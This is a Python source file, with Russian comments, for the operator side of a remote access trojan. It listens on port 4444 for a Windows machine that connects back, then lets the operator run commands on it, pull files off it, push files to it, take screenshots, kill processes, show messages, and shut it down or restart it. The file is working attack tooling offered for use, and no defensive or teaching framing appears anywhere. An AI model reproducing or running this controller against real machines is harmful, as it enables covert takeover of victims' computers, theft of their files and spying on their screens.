#!/usr/bin/env python3
"""
SERVER FOR KALI - Управление Windows с Kali
Запуск: python3 server_kali.py
"""

import socket
import threading
import os
import sys
import time
import subprocess
from colorama import init, Fore, Back, Style

init(autoreset=True)

# Цвета
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
RESET = Style.RESET_ALL

PORT = 4444
BUFFER = 4096

class KaliServer:
    def __init__(self):
        self.client = None
        self.running = True
        self.current_dir = "C:\\"
    
    def banner(self):
        os.system('clear')
        print(f"""
{R}╔═══════════════════════════════════════════════════════════════╗
║     💀 WINDOWS REMOTE CONTROLLER v1.0 💀                       ║
║     [KALI LINUX] → [WINDOWS]                                   ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
        """)
    
    def start(self):
        self.banner()
        
        # Получаем IP
        host = self.get_ip()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', PORT))
        server.listen(1)
        
        print(f"{C}[*] Сервер запущен на {host}:{PORT}{RESET}")
        print(f"{Y}[!] Жду подключения...{RESET}\n")
        
        self.client, addr = server.accept()
        print(f"{G}[+] ПОДКЛЮЧЕН! {addr}{RESET}\n")
        
        self.shell()
    
    def get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    
    def send_cmd(self, cmd):
        try:
            self.client.send(cmd.encode('utf-8'))
            response = self.client.recv(BUFFER).decode('utf-8', errors='ignore')
            return response
        except:
            return "[!] Ошибка связи"
    
    def download_file(self, remote_path):
        """Скачать файл с Windows"""
        filename = os.path.basename(remote_path)
        cmd = f"DOWNLOAD {remote_path}"
        self.client.send(cmd.encode('utf-8'))
        
        # Получаем размер файла
        size_data = self.client.recv(BUFFER).decode()
        if size_data.startswith("FILE_SIZE:"):
            file_size = int(size_data.split(":")[1])
            self.client.send(b"READY")
            
            # Получаем файл
            with open(filename, 'wb') as f:
                received = 0
                while received < file_size:
                    data = self.client.recv(BUFFER)
                    f.write(data)
                    received += len(data)
            
            print(f"{G}[+] Файл сохранен: {filename}{RESET}")
            return f"[+] Скачано: {filename}"
        else:
            return size_data
    
    def upload_file(self, local_path, remote_path):
        """Загрузить файл на Windows"""
        if not os.path.exists(local_path):
            return f"[-] Файл не найден: {local_path}"
        
        file_size = os.path.getsize(local_path)
        cmd = f"UPLOAD {remote_path} {file_size}"
        self.client.send(cmd.encode('utf-8'))
        
        time.sleep(0.5)
        with open(local_path, 'rb') as f:
            self.client.send(f.read())
        
        response = self.client.recv(BUFFER).decode()
        return response
    
    def take_screenshot(self):
        """Сделать скриншот Windows"""
        self.client.send(b"SCREENSHOT")
        time.sleep(2)
        
        # Получаем размер
        size_data = self.client.recv(BUFFER).decode()
        if size_data.startswith("SCREEN_SIZE:"):
            file_size = int(size_data.split(":")[1])
            self.client.send(b"READY")
            
            # Получаем скриншот
            with open("screenshot.png", 'wb') as f:
                received = 0
                while received < file_size:
                    data = self.client.recv(BUFFER)
                    f.write(data)
                    received += len(data)
            
            print(f"{G}[+] Скриншот сохранен: screenshot.png{RESET}")
            return "[+] Скриншот сохранен"
        else:
            return size_data
    
    def shell(self):
        """Интерактивная оболочка"""
        print(f"{C}═══════════════════════════════════════════════════════════════{RESET}")
        print(f"{G}[+] Управление Windows{RESET}")
        print(f"{Y}Команды:{RESET}")
        print(f"  {C}cmd <команда>{RESET}   - выполнить команду")
        print(f"  {C}shell{RESET}           - запустить cmd.exe")
        print(f"  {C}download <файл>{RESET} - скачать файл с Windows")
        print(f"  {C}upload <локальный> <удаленный>{RESET} - загрузить файл")
        print(f"  {C}screenshot{RESET}      - сделать скриншот")
        print(f"  {C}ps{RESET}             - список процессов")
        print(f"  {C}kill <PID>{RESET}      - убить процесс")
        print(f"  {C}msg <текст>{RESET}     - показать сообщение")
        print(f"  {C}shutdown{RESET}        - выключить ПК")
        print(f"  {C}restart{RESET}         - перезагрузить")
        print(f"  {C}exit{RESET}            - закрыть соединение")
        print(f"{C}═══════════════════════════════════════════════════════════════{RESET}\n")
        
        while self.running:
            try:
                cmd = input(f"{G}[KALI@{self.current_dir}]{RESET} > ").strip()
                
                if not cmd:
                    continue
                
                if cmd == "exit":
                    self.client.send(b"exit")
                    self.running = False
                    break
                
                elif cmd == "shell":
                    response = self.send_cmd("shell")
                    print(response)
                
                elif cmd == "screenshot":
                    response = self.take_screenshot()
                    print(response)
                
                elif cmd == "ps":
                    response = self.send_cmd("ps")
                    print(response)
                
                elif cmd.startswith("kill "):
                    pid = cmd.split()[1]
                    response = self.send_cmd(f"kill {pid}")
                    print(response)
                
                elif cmd.startswith("msg "):
                    msg = cmd[4:]
                    response = self.send_cmd(f"msg {msg}")
                    print(response)
                
                elif cmd == "shutdown":
                    confirm = input(f"{R}[!] Точно выключить? (y/n): {RESET}")
                    if confirm.lower() == 'y':
                        response = self.send_cmd("shutdown")
                        print(response)
                
                elif cmd == "restart":
                    confirm = input(f"{R}[!] Точно перезагрузить? (y/n): {RESET}")
                    if confirm.lower() == 'y':
                        response = self.send_cmd("restart")
                        print(response)
                
                elif cmd.startswith("download "):
                    filepath = cmd[9:]
                    response = self.download_file(filepath)
                    print(response)
                
                elif cmd.startswith("upload "):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        local = parts[1]
                        remote = parts[2]
                        response = self.upload_file(local, remote)
                        print(response)
                    else:
                        print("[-] Использование: upload <локальный_файл> <удаленный_путь>")
                
                elif cmd.startswith("cmd "):
                    command = cmd[4:]
                    response = self.send_cmd(f"cmd {command}")
                    print(response)
                
                elif cmd.startswith("cd "):
                    self.current_dir = cmd[3:]
                    response = self.send_cmd(f"cd {self.current_dir}")
                    print(response)
                
                else:
                    response = self.send_cmd(f"cmd {cmd}")
                    print(response)
                    
            except KeyboardInterrupt:
                print(f"\n{Y}[!] Прервано{RESET}")
                self.running = False
                break
            except Exception as e:
                print(f"{R}[-] Ошибка: {e}{RESET}")
        
        self.client.close()
        print(f"{G}[+] Соединение закрыто{RESET}")

if __name__ == "__main__":
    server = KaliServer()
    server.start()